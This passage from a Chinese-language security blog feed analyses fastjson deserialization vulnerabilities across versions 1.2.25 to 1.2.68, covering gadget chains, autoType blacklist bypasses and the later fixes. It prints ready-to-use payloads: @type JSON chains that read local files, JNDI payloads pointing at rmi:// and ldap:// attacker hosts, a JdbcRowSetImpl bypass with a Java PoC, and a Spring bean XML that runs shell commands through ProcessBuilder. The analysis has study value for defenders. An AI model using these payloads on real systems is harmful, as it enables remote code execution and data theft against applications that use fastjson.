class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;delegate&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;reader&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;file:///tmp/flag&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;boms&quot;</span>: [&#123;</span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bytes&quot;</span>: [<span class="number">66</span>]</span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;address&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.x.BOM&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>文件内容对应的ASCII正确</li></ul><div align=center><img src="/img/fastjson 1.2.68漏洞分析/36.png" alt="36" style="zoom:50%;" /></div><ul><li>文件不存在或ASCII不匹配</li></ul><div align=center><img src="/img/fastjson 1.2.68漏洞分析/37.png" alt="37" style="zoom:50%;" /></div><ul><li>web项目测试</li></ul><div align=center><img src="/img/fastjson 1.2.68漏洞分析/38.png" alt="38" style="zoom:50%;" /></div><blockquote><p>但是这种方法不一定在真实场景能利用，真实场景不一定会将解析的JSONObject直接返回回来</p></blockquote><p>也可以用来检测是否出网，或者检测是否&lt;=1.2.68版本</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;address&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.x.BOM&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;boms&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;bytes&quot;</span>: [],</span><br><span class="line">        <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;delegate&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;reader&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://dnslog&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-pgsql利用链"><a href="#2-5-pgsql利用链" class="headerlink" title="2.5 pgsql利用链"></a>2.5 pgsql利用链</h3><p><strong>maven:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.22.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>依赖类：</strong></p><ul><li>org.postgresql.jdbc.PgConnection</li><li>org.springframework.context.support.ClassPathXmlApplicationContext</li></ul><h4 id="2-5-1-PgConnection"><a href="#2-5-1-PgConnection" class="headerlink" title="2.5.1 PgConnection"></a>2.5.1 PgConnection</h4><div align=center><img src="/img/fastjson 1.2.68漏洞分析/39.png" alt="39" style="zoom:50%;" /></div>构造方法：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PgConnection</span><span class="params">(HostSpec[] hostSpecs, String user, String database, Properties info, String url)</span> <span class="keyword">throws</span> SQLException</span></span><br></pre></td></tr></table></figure>在PgConnection的构造方法中，执行到`ConnectionFactory.openConnection()`方法<div align=center><img src="/img/fastjson 1.2.68漏洞分析/40.png" alt="40" style="zoom:50%;" /></div><p>在ObjectFactory#instantiate方法中，将传入的类名即<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>进行实例化</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/41.png" alt="41" style="zoom:50%;" /></div><h4 id="2-5-2-ClassPathXmlApplicationContext实例化"><a href="#2-5-2-ClassPathXmlApplicationContext实例化" class="headerlink" title="2.5.2 ClassPathXmlApplicationContext实例化"></a>2.5.2 ClassPathXmlApplicationContext实例化</h4><div align=center><img src="/img/fastjson 1.2.68漏洞分析/42.png" alt="42" style="zoom:50%;" /></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPathXmlApplicationContext &lt;init&gt;</span><br><span class="line">- AbstractApplicationContext refresh</span><br><span class="line">- AbstractApplicationContext obtainFreshBeanFactory</span><br><span class="line">- AbstractRefreshableApplicationContext refreshBeanFactory</span><br><span class="line">- AbstractXmlApplicationContext loadBeanDefinitions</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.68漏洞分析/43.png" alt="43" style="zoom:50%;" /></div><p>接下来遍历<code>configLocations</code>，开始获取资源，如图先后判断了字符串是否是 <code>classpath*:</code>、<code>war:</code>这种格式；匹配资源字符串的格式后，最终因为使用了http://的格式，返回了<code>URL</code>对象</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/44.png" alt="44" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.68漏洞分析/45.png" alt="45" style="zoom:50%;" /></div>构造spring bean配置的xml<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;work&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/sh<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>open /System/Applications/Calculator.app<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;do&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;work.start()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.68漏洞分析/46.png" alt="46" style="zoom:50%;" /></div>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson 1.2.48-1.2.67漏洞分析</title>
      <link href="/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>版本：1.2.48-1.2.60</p></blockquote><h2 id="1-针对1-2-47问题的修复"><a href="#1-针对1-2-47问题的修复" class="headerlink" title="1. 针对1.2.47问题的修复"></a>1. 针对1.2.47问题的修复</h2><p>首先<code>checkAutoType</code>方法中，从之前几个版本开始，黑白名单的校验通过<code>hash</code>对比来处理，有效的防止大家针对黑名单去绕过<br>使用<code>&#123;&quot;@type&quot;: &quot;java.lang.Class&quot;&#125;</code>调试，发现在黑名单校验处抛出异常了，说明<code>Class</code>类已经被拉黑了</p><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/1.png" alt="1" style="zoom:50%;" /></div><h2 id="2-新的利用链"><a href="#2-新的利用链" class="headerlink" title="2. 新的利用链"></a>2. 新的利用链</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="attr">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="attr">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>有师傅在这两个类中找到了<code>jndi</code>的相关利用链，不得不记录下github上自动扫描类去寻找相关关键字的脚本<br><a href="https://github.com/Lonely-night/fastjson_gadgets_scanner">https://github.com/Lonely-night/fastjson_gadgets_scanner</a><br><a href="https://github.com/H3rmesk1t/Fastjson-Gadgets-Automatic-Scanner">https://github.com/H3rmesk1t/Fastjson-Gadgets-Automatic-Scanner</a></p><h3 id="2-1-OracleManagedConnectionFactory"><a href="#2-1-OracleManagedConnectionFactory" class="headerlink" title="2.1 OracleManagedConnectionFactory"></a>2.1 OracleManagedConnectionFactory</h3><blockquote><p>这个依赖用于Java程序连接Oracle数据库的驱动，即<code>ojdbc</code></p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.oracle.database.jdbc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ojdbc10<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>19.10.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-1-1-触发点"><a href="#2-1-1-触发点" class="headerlink" title="2.1.1 触发点"></a>2.1.1 触发点</h4><p><code>oracle.jdbc.connector.OracleManagedConnectionFactory#setupXADataSource</code>，参数是<code>xaDataSourceName</code></p><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/2.png" alt="2" style="zoom:50%;" /></div><h4 id="2-1-2-触发链getLogWriter"><a href="#2-1-2-触发链getLogWriter" class="headerlink" title="2.1.2 触发链getLogWriter"></a>2.1.2 触发链getLogWriter</h4><p>如图，在<code>getLogWriter</code>中，调用了<code>setupXADataSource()</code>；但是<code>getLogWriter()</code>如何触发呢，</p><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/3.png" alt="3" style="zoom:50%;" /></div><h4 id="2-1-3-如何自动触发"><a href="#2-1-3-如何自动触发" class="headerlink" title="2.1.3 如何自动触发"></a>2.1.3 如何自动触发</h4><p>这里想到之前<code>BCEL</code>的<code>poc</code>构造，结合<code>com.alibaba.fastjson.JSONObject</code>去触发<code>get</code>方法请求</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;   </span><br><span class="line">  &#123;</span><br><span class="line">  &quot;x&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://VPS/1&quot;&#125;</span><br><span class="line">&#125;: &quot;&quot;b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是此处触发和<code>1.2.24</code>不同<br>在<code>DefaultJSONParser</code>中，当<code>object</code>是<code>JSONObject</code>类型时，不再执行<code>toString</code></p><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/4.png" alt="4" style="zoom:50%;" /></div><p>但是当我们指定 <code>&#123;&#125;:&quot;&quot;</code>，这里会抛出异常</p><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/5.png" alt="5" style="zoom:50%;" /></div><p><code>Java的&quot;aaa&quot; + &quot;bbb&quot; + new Student()</code></p><p>前面的字符串会使用<code>StringBuilder.append</code>拼接，拼接中的对象会调用<code>toString</code>方法</p><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/6.png" alt="6" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/7.png" alt="7" style="zoom:50%;" /></div>剩下的流程就和BCEL中最后`invoke` `get`方法一样了<hr><p><strong>思路：通过构造</strong><code>**&quot;&quot;xxx**</code><strong>这种json字段，</strong><code>**value**</code><strong>的JSON解析抛出异常，触发</strong><code>**key.toString**</code></p><hr><h3 id="2-2-org-apache-commons-configuration-JNDIConfiguration"><a href="#2-2-org-apache-commons-configuration-JNDIConfiguration" class="headerlink" title="2.2 org.apache.commons.configuration.JNDIConfiguration"></a>2.2 org.apache.commons.configuration.JNDIConfiguration</h3><p>这个组件是<code>Apache</code>开源组织提供的用于操作配置文件的工具包</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="attr">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-2-1-触发点"><a href="#2-2-1-触发点" class="headerlink" title="2.2.1 触发点"></a>2.2.1 触发点</h4><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/8.png" alt="8" style="zoom:50%;" /></div><h4 id="2-2-2-Poc构造"><a href="#2-2-2-Poc构造" class="headerlink" title="2.2.2 Poc构造"></a>2.2.2 Poc构造</h4><p>和<code>ojdbc</code>的利用链一样，通过触发<code>JSONException</code>，利用<code>JSONObject.toString()</code>触发getXXX方法执行</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://VPS&quot;&#125;</span><br><span class="line">&#125;:&quot;&quot;a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="2-3-问题"><a href="#2-3-问题" class="headerlink" title="2.3 问题"></a>2.3 问题</h3><p>这个利用方法并没有绕过<code>AutoTypeSupport</code>问题，需要手动开启</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><h3 id="2-4-1-2-61修复"><a href="#2-4-1-2-61修复" class="headerlink" title="2.4 1.2.61修复"></a>2.4 1.2.61修复</h3><h4 id="2-4-1-进入checkAutoType之前"><a href="#2-4-1-进入checkAutoType之前" class="headerlink" title="2.4.1 进入checkAutoType之前"></a>2.4.1 进入checkAutoType之前</h4><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/9.png" alt="9" style="zoom:50%;" /></div>#### 2.4.2 两个利用链的类被加入了黑名单的hash中<div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/10.png" alt="10" style="zoom:50%;" /></div><h4 id="2-4-3-Hash计算"><a href="#2-4-3-Hash计算" class="headerlink" title="2.4.3 Hash计算"></a>2.4.3 Hash计算</h4><p>去除计算代码，看下的是什么黑名单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String className = <span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>;</span><br><span class="line"><span class="keyword">long</span> h3 = (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">2</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line"><span class="keyword">long</span> hash;</span><br><span class="line"><span class="keyword">int</span> mask;</span><br><span class="line">    hash = h3;</span><br><span class="line">    <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">        hash ^= (<span class="keyword">long</span>)className.charAt(mask);</span><br><span class="line">        hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">        System.out.println(mask);</span><br><span class="line">        System.out.println(className.charAt(mask));</span><br><span class="line">        System.out.println(className.substring(<span class="number">0</span>, mask + <span class="number">1</span>));</span><br><span class="line">        System.out.println(hash);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">49</span><br><span class="line">n</span><br><span class="line">org.apache.commons.configuration.JNDIConfiguration</span><br><span class="line">8925522461579647174</span><br></pre></td></tr></table></figure><p>看来是把整个包路径+类名都加进去了</p>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson 1.2.25-1.2.47漏洞分析</title>
      <link href="/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>在1.2.24漏洞分析中，已经有几条利用链了，把版本切换到<code>1.2.25</code>，运行一下<code>poc</code></p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/1.png" alt="1" style="zoom:50%;" /></div><h2 id="1-修复分析"><a href="#1-修复分析" class="headerlink" title="1. 修复分析"></a>1. 修复分析</h2><p>poc运行失败了，直接跳转到报错位置分析</p><h3 id="1-1-checkAutoType方法"><a href="#1-1-checkAutoType方法" class="headerlink" title="1.1 checkAutoType方法"></a>1.1 checkAutoType方法</h3><p>a. 调试发现在<code>parseObject</code>方法中，key=<code>@type</code>进行类加载时，发现多了一个<code>checkAutoType</code>方法</p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/2.png" alt="2" style="zoom:50%;" /></div><p>b. 进入<code>ParseConfig.checkAutoType</code>方法，这里判断了<code>autoTypeSupport</code>是否为<code>false</code>，并进入黑名单判断，黑名单中包括了<code>com.sun</code></p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/3.png" alt="3" style="zoom:50%;" /></div><p>所以此时我们的poc在这里就会抛出异常，<code>autoType is not support ...</code></p><h3 id="1-2-autoTypeSupport"><a href="#1-2-autoTypeSupport" class="headerlink" title="1.2 autoTypeSupport"></a>1.2 autoTypeSupport</h3><p>实际上，如果<code>autoTypeSupport</code>一直都是<code>false</code>的，程序会直接抛出异常，哪怕是一个普通的类的反序列化</p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/4.png" alt="4" style="zoom:50%;" /></div>使用正常的一个测试`User`类测试反序列化<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/5.png" alt="5" style="zoom:50%;" /></div>### 1.3 开启autoTypeSupport这里假设，如果是这个版本，开发需要使用`fastjson`去序列化/反序列化对象，那么手动开启了`autoTypeSupport`属性，此时结合`className`过滤L和;的情况，构造`Lcom.sun.rowset.JdbcRowSetImpl;`来绕过黑名单的过滤<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/6.png" alt="6" style="zoom:50%;" /></div><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://dnslog.cn&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;&quot;</span> +</span><br><span class="line">    <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    \&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    \&quot;dataSourceName\&quot;: \&quot;rmi://dnslog.cn\&quot;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    \&quot;autoCommit\&quot;: true;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">    <span class="string">&quot;&quot;</span>;</span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">JSON.parse(poc);</span><br></pre></td></tr></table></figure><h2 id="2-不开启autoTypeSupport的绕过"><a href="#2-不开启autoTypeSupport的绕过" class="headerlink" title="2. 不开启autoTypeSupport的绕过"></a>2. 不开启autoTypeSupport的绕过</h2><h3 id="2-1-内置的Class类"><a href="#2-1-内置的Class类" class="headerlink" title="2.1 内置的Class类"></a>2.1 内置的Class类</h3><p><code>CheckAutoType</code>中，可以在默认的解析器Map里找到<code>java.lang.Class</code>这个内置类</p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/a.png" alt="a" style="zoom:50%;" /></div><p>此时再回到<code>parseObject</code>中，看下<code>java.lang.Class</code>对应的<code>deserializer</code>是什么；<br>调试看到对应的<code>deserializer</code>是<code>MiscCodec</code>，这和<code>java.net.InetAddress</code>一样</p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/8.png" alt="8" style="zoom:50%;" /></div><p><code>MiscCodec</code>中，当<code>@type</code>对应的是Class类时，返回<code>TypeUtils.loadClass</code></p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/9.png" alt="9" style="zoom:50%;" /></div><h3 id="2-2-Class类通过TypeUtils-loadClass加载类"><a href="#2-2-Class类通过TypeUtils-loadClass加载类" class="headerlink" title="2.2 Class类通过TypeUtils.loadClass加载类"></a>2.2 Class类通过TypeUtils.loadClass加载类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 